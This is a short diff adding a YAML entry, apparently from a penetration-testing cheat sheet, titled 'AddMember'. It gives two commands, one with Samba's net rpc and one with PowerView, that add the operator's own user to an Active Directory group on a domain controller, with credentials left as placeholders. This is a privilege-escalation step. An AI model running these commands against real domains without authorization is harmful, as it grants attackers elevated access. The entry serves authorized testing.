@@ -1,0 +1,10 @@
+name: AddMember
+description: Add members to the group
+commands:
+- '# net rpc'
+- net rpc group addmem '<GROUP>' '<YOUR_USER>' -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' -S <DC_IP>
+- ''
+- '# PowerView'
+- Add-DomainGroupMember -Identity '<GROUP>' -Members '<YOUR_USER>'
+opsec: []
+references: []
